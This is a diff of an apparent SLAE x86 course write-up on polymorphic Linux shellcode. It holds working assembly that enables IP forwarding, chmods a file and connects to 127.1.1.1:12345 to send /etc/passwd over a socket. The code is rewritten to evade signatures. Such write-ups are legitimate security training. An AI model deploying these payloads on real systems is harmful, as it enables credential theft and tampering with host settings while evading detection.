@@ -164,71 +164,71 @@ _start:
 	add ebx, 0xdfd04e8		; 0x726f665f = 0x64726177 + 0xdfd04e8
 	push ebx
 
-  ;push dword 0x70692f34
+  	;push dword 0x70692f34
 	sub ebx, 0x206372b		; 0x70692f34 = 0x726f665f - 0x206372b
 	push ebx	
 
-  ;push dword 0x7670692f
+  	;push dword 0x7670692f
 	add ebx, 0x60739fb		; 0x7670692f = 0x70692f34 + 0x60739fb
 	push ebx
 
-  ;push dword 0x74656e2f
+  	;push dword 0x74656e2f
 	sub ebx, 0x20afb01		; 0x74656e2f = 0x7670692f - 0x20afb01 + 1
 	inc ebx					; +1 to avoid null byte [0x7670692f - 0x74656e2f] = [0x20afb00]
 	push ebx
 
-  ;push dword 0x2f737973
+  	;push dword 0x2f737973
 	sub ebx, 0x44f1f4bc		; 0x2f737973 = 0x74656e2f - 0x44f1f4bc
 	push ebx
 
-  ;push dword 0x2f636f72
+  	;push dword 0x2f636f72
 	sub ebx, 0x11223344		; 0x2f737973 - 0x11223344 + 0x11122943 = 0x2f636f72
 	add ebx, 0x11122943
 	push ebx
 
-  push word 0x702f
+  	push word 0x702f
 
-  mov ebx,esp
+ 	 mov ebx,esp
 
 	;xor ecx,ecx
-  ;mov cl,0x1
+  	;mov cl,0x1
 	push 0x1
 	pop ecx
 	
-  mov al,0x5
-  int 0x80
+  	mov al,0x5
+  	int 0x80
 
 	;mov ebx,eax
 	push eax
 	pop ebx
 
 	xor ecx,ecx
-    push ecx
-    push byte +0x30
-    mov ecx,esp
+    	push ecx
+    	push byte +0x30
+    	mov ecx,esp
         
 	;xor edx,edx
-    ;mov dl,0x1
+    	;mov dl,0x1
 	push 0x1
 	pop edx
 	
-    mov al,0x4
-    int 0x80
+    	mov al,0x4
+    	int 0x80
 
-    ;xor eax,eax
-    ;add eax,byte +0x6
+   	;xor eax,eax
+    	;add eax,byte +0x6
 	push 0x6
 	pop eax
 
-    int 0x80
+    	int 0x80
 
-    ;xor eax,eax
-    ;inc eax
+    	;xor eax,eax
+   	;inc eax
 	push 0x1
 	pop eax
 
-    xor ebx,ebx
-    int 0x80
+    	xor ebx,ebx
+    	int 0x80
 ```
 Let us test our polymorphic version.
 ![shellcode-848-poly-running](/assets/SLAE-x86/6.1-shellcode-848-poly-running.PNG)
@@ -275,6 +275,8 @@ int main(void)
 		return 0;
 }
 ```
+Making sure the original is working.
+![6.2-shellcode-622-og-running](/assets/SLAE-x86/6.2-shellcode-622-og-running.PNG)
 The polymorphic version of the above shellcode is as follows:
 ```nasm
 ; Title 		: SLAE Linux/x86 - Assignment-6.2
@@ -328,7 +330,7 @@ _start:
 	int 0x80
 ```
 Lets test our polymorphic version.
-[image here]
+![shellcode-622-poly-running](/assets/SLAE-x86/6.2-shellcode-622-poly-running.PNG)
 The polymorphic shellcode works and is smaller than the original shellcode.
 Original Shellcode : **32 bytes**
 poymorphic Shellcode : **28 bytes (4 bytes smaller than original) - 12.5% decrease**
@@ -354,7 +356,7 @@ void main(){
 }
 ```
 Making sure its working.
-[Image here]
+![shellcode-542-og](/assets/SLAE-x86/6.3-shellcode-542-og.PNG)
 Polymorphic version of the shellcode:
 
 ```nasm
@@ -374,21 +376,21 @@ _start:
 	
         jmp short get_addr
 		string_addr:
-            pop ebx
+            		pop ebx
 			push 0x27
 			pop eax
 			mov cx,0x1ed
-            int 0x80
+            		int 0x80
               	
 			mov al,0x1
-            xor ebx,ebx
-            int 0x80
+            		xor ebx,ebx
+            		int 0x80
 	get_addr:
         	call string_addr
         	fname db "hacked"
 ```
 Lets test the polymorphic version.
-[image here]
+![shellcode-542-poly](/assets/SLAE-x86/6.3-shellcode-542-poly.PNG)
 Original Shellcode : **36 bytes**
 Polymorphic Shellcode :	**29 Bytes (7 bytes less than the original) - ~19.45% decrease**
 
@@ -490,7 +492,7 @@ main()
 }
 ```
 Lets make sure that the original works fine.
-[image here]
+![shellcode-861-og](/assets/SLAE-x86/6.4-shellcode-861-og.PNG)
 polymorphic version of the above shellcode is as follows:
 ```nasm
 ; Title 	: SLAE Linux/x86 - Assignment-6.4
@@ -507,76 +509,76 @@ polymorphic version of the above shellcode is as follows:
 section .text
 global _start
 _start:
-    ; socket
+    	; socket
 	push BYTE 0x66    ; socketcall 102
 	pop eax
 
 	;xor ebx, ebx 
-    ;inc ebx 
+    	;inc ebx 
 	push byte 0x1
 	pop ebx
 
-    ;xor edx, edx
-    ;push edx 
+    	;xor edx, edx
+    	;push edx 
 	cdq
 	push edx
 	
-    push BYTE 0x1
+   	push BYTE 0x1
 	push BYTE 0x2
 
 	;mov ecx, esp
 	push esp
 	pop ecx
 
-    int 0x80
+    	int 0x80
 
-    ;mov esi, eax
+    	;mov esi, eax
 	push eax
 	pop esi
 
-    ; connect
-    push BYTE 0x66 
-    pop eax
-    inc ebx
+    	; connect
+    	push BYTE 0x66 
+    	pop eax
+    	inc ebx
 
-    ;push DWORD 0x0101017f  ;127.1.1.1
+    	;push DWORD 0x0101017f  ;127.1.1.1
 	mov edx, 0x01010101
 	add edx,0x7e
 	push edx
 
-    ;push WORD 0x3930  ; Port 12345
+    	;push WORD 0x3930  ; Port 12345
 	add dx, 0x37b1		; dx = 0x017f ; 0x37b1 + 0x017f = 0x3930
 	push word dx
 
-    push WORD bx
-    mov ecx, esp
-    push BYTE 16
-    push ecx
-    push esi
-    mov ecx, esp
-    inc ebx
-    int 0x80
+    	push WORD bx
+    	mov ecx, esp
+    	push BYTE 16
+    	push ecx
+    	push esi
+    	mov ecx, esp
+    	inc ebx
+   	int 0x80
 
-    ; dup2
-    mov esi, eax
-    push BYTE 0x1
-    pop ecx
-    mov BYTE al, 0x3F
-    int 0x80
+    	; dup2
+    	mov esi, eax
+    	push BYTE 0x1
+    	pop ecx
+    	mov BYTE al, 0x3F
+    	int 0x80
     
-    ;read the file
-    ;jmp short call_shellcode
+    	;read the file
+    	;jmp short call_shellcode
     
 ;shellcode:
 
-    ;push 0x5
-    ;pop eax
+    	;push 0x5
+    	;pop eax
 	xor eax, eax
 	push eax		; null byte to terminate our /etc//passwd string
 	mov al, 0x5
 
 	;removing the jmp call pop
-    ;pop ebx
+    	;pop ebx
 
 	;"/etc//passwd"[::-1].encode("hex")
 	; 6477737361702f2f6374652f
@@ -594,46 +596,46 @@ _start:
 	;------------------
 	mov ebx, esp
 
-    xor ecx,ecx
-    int 0x80
+    	xor ecx,ecx
+    	int 0x80
     
 	;mov ebx,eax
 	push eax
 	pop ebx
 
 	mov al,0x3
-    mov edi,esp
-    mov ecx,edi
+    	mov edi,esp
+    	mov ecx,edi
 
-    ;xor edx,edx
+    	;xor edx,edx
 	cdq
 
-    ;mov dh,0xff
-    ;mov dl,0xff
+    	;mov dh,0xff
+    	;mov dl,0xff
 
 	mov dx,0xffff
-    int 0x80
+    	int 0x80
 
 	;mov edx,eax
 	push eax
 	pop edx
 
-    push 0x4
-    pop eax
-    mov bl, 0x1
+    	push 0x4
+    	pop eax
+    	mov bl, 0x1
 
-    int 0x80
-    push 0x1
-    pop eax
-    inc ebx
-    int 0x80
+    	int 0x80
+    	push 0x1
+    	pop eax
+    	inc ebx
+    	int 0x80
     
 ;call_shellcode:
 ;    	call shellcode
 ;    	message db "/etc/passwd"
 ```
 lets test our polymorphic shellcode.
-[image here]
+![shellcode-861-poly](/assets/SLAE-x86/6.4-shellcode-861-poly.PNG)
 Original Shellcode : **111 bytes**
 Polymorphic Shellcode : **128 Bytes (~15.3% increase in shellcode size)**
 
